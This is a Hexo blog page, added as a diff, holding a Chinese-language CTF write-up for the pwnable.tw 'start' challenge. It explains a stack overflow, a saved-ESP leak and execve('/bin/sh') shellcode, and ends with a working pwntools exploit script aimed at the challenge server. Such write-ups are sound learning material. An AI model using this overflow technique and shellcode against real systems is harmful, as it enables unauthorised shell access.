@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/xiaohong404.github.io/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/xiaohong404.github.io/images/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/xiaohong404.github.io/images/logo.png">
+  <link rel="mask-icon" href="/xiaohong404.github.io/images/logo.png" color="#222">
+
+<link rel="stylesheet" href="/xiaohong404.github.io/css/main.css">
+
+
+<link rel="stylesheet" href="/xiaohong404.github.io/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/xiaohong404.github.io/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="start">
+<meta property="og:url" content="https://github.com/xiaohong404/xiaohong404.github.io/2020/11/04/start/index.html">
+<meta property="og:site_name" content="Mr.red">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-11-04T08:41:33.000Z">
+<meta property="article:modified_time" content="2020-11-04T09:49:44.000Z">
+<meta property="article:author" content="Xiao Hong">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://github.com/xiaohong404/xiaohong404.github.io/2020/11/04/start/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>start | Mr.red</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/xiaohong404.github.io/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mr.red</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/xiaohong404.github.io/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/xiaohong404.github.io/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/xiaohong404.github.io/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/xiaohong404.github.io/Categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/xiaohong404.github.io/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://github.com/xiaohong404/xiaohong404.github.io/2020/11/04/start/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars1.githubusercontent.com/u/69063618?s=460&u=11199d69e5551ba91c0709fae0a30a592ab1271b&v=4">
+      <meta itemprop="name" content="Xiao Hong">
+      <meta itemprop="description" content="Things always start to get better after you give up">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mr.red">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          start
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-11-04 16:41:33 / Modified: 17:49:44" itemprop="dateCreated datePublished" datetime="2020-11-04T16:41:33+08:00">2020-11-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/xiaohong404.github.io/Categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/xiaohong404.github.io/Categories/PWN/Pwnable-xyz/" itemprop="url" rel="index"><span itemprop="name">Pwnable.xyz</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/xiaohong404.github.io/2020/11/04/start/" class="post-meta-item leancloud_visitors" data-flag-title="start" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/xiaohong404.github.io/2020/11/04/start/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/xiaohong404.github.io/2020/11/04/start/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong></strong></p>
+ <a id="more"></a>
+<p><strong></strong></p>
+<h3 id="检查文件保护措施"><a href="#检查文件保护措施" class="headerlink" title="检查文件保护措施"></a>检查文件保护措施</h3><p><strong></strong></p>
+<p><strong>RELRO(Relocation Read Only)：尽量使存储区域只读</strong></p>
+<h3 id="IDA32查看文件"><a href="#IDA32查看文件" class="headerlink" title="IDA32查看文件"></a>IDA32查看文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">3</span>;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span>     <span class="number">80</span>h; LINUX - sys_write</span><br><span class="line">    <span class="keyword">int</span>     <span class="number">80</span>h; LINUX -</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其对应的汇编代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">保存现场环境esp、_exit</span><br><span class="line">.text:<span class="number">08048060</span>                 push    esp</span><br><span class="line">.text:<span class="number">08048061</span>                 push    offset _exit</span><br><span class="line"></span><br><span class="line">清空寄存器EAX EBX ECX EDX</span><br><span class="line">.text:<span class="number">08048066</span>                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">08048068</span>                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0804806</span>A                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">.text:<span class="number">0804806</span>C                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line"></span><br><span class="line">向栈上压入参数</span><br><span class="line">.text:<span class="number">0804806</span>E                 push    <span class="number">3</span>A465443h    CTF:</span><br><span class="line">.text:<span class="number">08048073</span>                 push    <span class="number">20656874</span>h    the</span><br><span class="line">.text:<span class="number">08048078</span>                 push    <span class="number">20747261</span>h    art</span><br><span class="line">.text:<span class="number">0804807</span>D                 push    <span class="number">74732073</span>h    s st</span><br><span class="line">.text:<span class="number">08048082</span>                 push    <span class="number">2774654</span>Ch    Let’</span><br><span class="line"></span><br><span class="line">系统调用<span class="number">80</span>h</span><br><span class="line">.text:<span class="number">08048087</span>                 mov     ecx, esp        ; addr</span><br><span class="line">.text:<span class="number">08048089</span>                 mov     dl, <span class="number">14</span>h         ; len</span><br><span class="line">.text:<span class="number">0804808B</span>                 mov     bl, <span class="number">1</span>           ; fd</span><br><span class="line">.text:<span class="number">0804808</span>D                 mov     al, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804808F</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX - sys_write</span><br><span class="line"></span><br><span class="line">系统调用<span class="number">80</span>h</span><br><span class="line">.text:<span class="number">08048091</span>                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">08048093</span>                 mov     dl, <span class="number">3</span>Ch</span><br><span class="line">.text:<span class="number">08048095</span>                 mov     al, <span class="number">3</span></span><br><span class="line">.text:<span class="number">08048097</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX -</span><br><span class="line"></span><br><span class="line">恢复栈平衡，返回到_exit</span><br><span class="line">.text:<span class="number">08048099</span>                 add     esp, <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">0804809</span>C                 retn</span><br><span class="line">.text:<span class="number">0804809</span>C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>
+<p>函数结构很简单，采用<code>int 80</code>调用了两个系统调用，下面先补充<code>int 80</code>系统调用的细节：</p>
+<blockquote>
+<p>1． 执行用户程序(如:fork)<br>2． 根据glibc中的函数实现，取得系统调用号并执行int $0x80产生中断。<br>3． 进行地址空间的转换和堆栈的切换，执行SAVE_ALL。（进行内核模式）<br>4． 进行中断处理，根据系统调用表调用内核函数。<br>5． 执行内核函数。<br>6． 执行RESTORE_ALL并返回用户模式<br>Linux 32位的系统调用时通过int 80h来实现的，<strong>eax寄存器中为调用的功能号</strong>，ebx、ecx、edx、esi等等寄存器则依次为参数。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29343201/article/details/52209588">系统调用功能号</a></p>
+<p>这里使用的两个系统调用信息如下：</p>
+<h4 id="第一个系统调用："><a href="#第一个系统调用：" class="headerlink" title="第一个系统调用："></a><strong>第一个系统调用：</strong></h4><p>将esp开始的14h字节数据写入标准输出（文件描述符1），即输出”Let’s start the CTF:”</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">name</th>
+<th style="text-align:left">eax</th>
+<th style="text-align:left">ebx</th>
+<th style="text-align:left">ecx</th>
+<th style="text-align:left">edx</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><a target="_blank" rel="noopener" href="http://www.kernel.org/doc/man-pages/online/pages/man2/write.2.html">sys_write</a></td>
+<td style="text-align:left">0x04</td>
+<td style="text-align:left">unsigned int fd = 1</td>
+<td style="text-align:left">const char __user *buf = esp</td>
+<td style="text-align:left">size_t count =14h</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="第二个系统调用"><a href="#第二个系统调用" class="headerlink" title="第二个系统调用"></a>第二个系统调用</h4><p>从标准输入读取3ch字节到栈空间。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">name</th>
+<th style="text-align:left">eax</th>
+<th style="text-align:left">ebx</th>
+<th style="text-align:left">ecx</th>
+<th style="text-align:left">edx</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><a target="_blank" rel="noopener" href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html">sys_read</a></td>
+<td style="text-align:left">0x03</td>
+<td style="text-align:left">unsigned int fd = 1</td>
+<td style="text-align:left">char __user *buf = esp</td>
+<td style="text-align:left">size_t count = 3ch</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><h4 id="1-程序执行到0804808F"><a href="#1-程序执行到0804808F" class="headerlink" title="1 .程序执行到0804808F"></a>1 .程序执行到0804808F</h4><p>sys_write，输出14h字节数据：Let’s start the CTF:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">	+-----------------+      &lt;----</span><br><span class="line">    |       Let’      |         |     </span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       s st      |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       art       |        <span class="number">14</span>h</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       the       |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       CTF:      |         |</span><br><span class="line">    +-----------------+      &lt;-----</span><br><span class="line">    |   offset _exit  |</span><br><span class="line">    +-----------------+</span><br><span class="line">    |    Saved ESP    |</span><br><span class="line">H-&gt; +-----------------+</span><br></pre></td></tr></table></figure>
+<h4 id="2-程序执行到08048097"><a href="#2-程序执行到08048097" class="headerlink" title="2.程序执行到08048097"></a>2.程序执行到08048097</h4><p>sys_read，read函数最多可以读取3ch字节，超出了分配的空间，可以用来覆盖ret_addr和esp。经调试验证，20字节后覆盖ret，24字节后覆盖esp。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    +-----------------+      &lt;----</span><br><span class="line">    |       aaaa      |         |     </span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |        <span class="number">14</span>h</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |         |</span><br><span class="line">    +-----------------+      &lt;-----</span><br><span class="line">    |       aaaa      |</span><br><span class="line">    +-----------------+</span><br><span class="line">    |    Saved ESP    |</span><br><span class="line">H-&gt; +-----------------+</span><br></pre></td></tr></table></figure>
+<h4 id="3-泄露ESP"><a href="#3-泄露ESP" class="headerlink" title="3.泄露ESP"></a>3.泄露ESP</h4><p>现在EIP已经在我们的掌控之中了，关键是如何跳转到布置的shell code中。一般来说，首先会去找JMP ESP指令，这样就能让shellcode获得执行。但这段汇编代码没有，可以利用的只有read和write。如果可以write出Saved ESP的地址，然后覆盖掉offset _exit，就能成功shell。</p>
+<h4 id="4-覆盖RET"><a href="#4-覆盖RET" class="headerlink" title="4. 覆盖RET"></a>4. 覆盖RET</h4><p>此时程序已经泄露出之前的Saved_esp，栈的情况已经摸清了，然后程序继续执行read，注意read完 add esp, 14h后再ret，因此，ret_addr在esp+14h的地方。</p>
+<h4 id="5-shellcode-原理"><a href="#5-shellcode-原理" class="headerlink" title="5. shellcode(原理)"></a>5. shellcode(原理)</h4><p>shellcode同样可以用系统调用的方式执行execve(“/bin/sh”,NULL,NULL)</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">name</th>
+<th style="text-align:left">eax</th>
+<th style="text-align:left">ebx</th>
+<th style="text-align:left">ecx</th>
+<th style="text-align:left">edx</th>
+<th style="text-align:left">esi</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><a target="_blank" rel="noopener" href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">sys_execve</a></td>
+<td style="text-align:left">0x0b</td>
+<td style="text-align:left">char __user *</td>
+<td style="text-align:left">char <strong>user *</strong>user *</td>
+<td style="text-align:left">char <strong>user *</strong>user *</td>
+<td style="text-align:left"><a target="_blank" rel="noopener" href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs</a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>其中，该程序是 32 位，所以我们需要使得</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">xor</span> eax,eax</span><br><span class="line">push eax</span><br><span class="line">push %s</span><br><span class="line">push %s</span><br><span class="line">mov ebx, esp</span><br><span class="line"><span class="keyword">xor</span> ecx,ecx</span><br><span class="line"><span class="keyword">xor</span> edx,edx</span><br><span class="line">mov al, <span class="number">0xb</span></span><br><span class="line">int 0x80&#x27;&#x27;&#x27; %(u32(&#x27;/sh\0&#x27;),u32(&#x27;/bin&#x27;))</span><br></pre></td></tr></table></figure>
+<p>使用asm(shellcode)来进行汇编,可以使用context来指定cpu类型以及操作系统。</p>
+<p>如：<code>context(arch = ‘amd64’ , os = ‘linux’, log_level=”debug”)</code></p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">rem = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#等待write执行完毕</span></span><br><span class="line">rem.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送溢出数据，覆盖ret为0x08048087-&gt;输出14h字节</span></span><br><span class="line">line = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(<span class="number">0x8048087</span>)</span><br><span class="line">rem.send(line)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收输出数据，其中就有Saved ESP</span></span><br><span class="line">stack_addr = rem.recv()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#直接使用网上的shellcode</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"><span class="comment">#参考覆盖RET分析</span></span><br><span class="line">shellcode_addr = p32(int.from_bytes(stack_addr, <span class="string">&#x27;little&#x27;</span>) + <span class="number">20</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x14</span> + shellcode_addr + shellcode</span><br><span class="line">rem.sendline(payload)</span><br><span class="line"></span><br><span class="line">rem.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong></strong></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/xiaohong404.github.io/tags/PWN/" rel="tag"><i class="fa fa-tag"></i> PWN</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/xiaohong404.github.io/2020/11/04/PWN/Pwnable_xyz/start/" rel="prev" title="start">
+      <i class="fa fa-chevron-left"></i> start
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+  
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="nav-number">1.</span> <span class="nav-text">检查文件保护措施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA32%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">IDA32查看文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">第一个系统调用：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-number">2.2.</span> <span class="nav-text">第二个系统调用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">思路分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E5%88%B00804808F"><span class="nav-number">3.1.</span> <span class="nav-text">1 .程序执行到0804808F</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E5%88%B008048097"><span class="nav-number">3.2.</span> <span class="nav-text">2.程序执行到08048097</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%B3%84%E9%9C%B2ESP"><span class="nav-number">3.3.</span> <span class="nav-text">3.泄露ESP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E8%A6%86%E7%9B%96RET"><span class="nav-number">3.4.</span> <span class="nav-text">4. 覆盖RET</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-shellcode-%E5%8E%9F%E7%90%86"><span class="nav-number">3.5.</span> <span class="nav-text">5. shellcode(原理)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99python%E8%84%9A%E6%9C%AC"><span class="nav-number">4.</span> <span class="nav-text">编写python脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PWN"><span class="nav-number">5.</span> <span class="nav-text">PWN</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xiao Hong"
+      src="https://avatars1.githubusercontent.com/u/69063618?s=460&u=11199d69e5551ba91c0709fae0a30a592ab1271b&v=4">
+  <p class="site-author-name" itemprop="name">Xiao Hong</p>
+  <div class="site-description" itemprop="description">Things always start to get better after you give up</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/xiaohong404.github.io/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/xiaohong404.github.io/Categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/xiaohong404.github.io/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xiaohong404" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xiaohong404"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
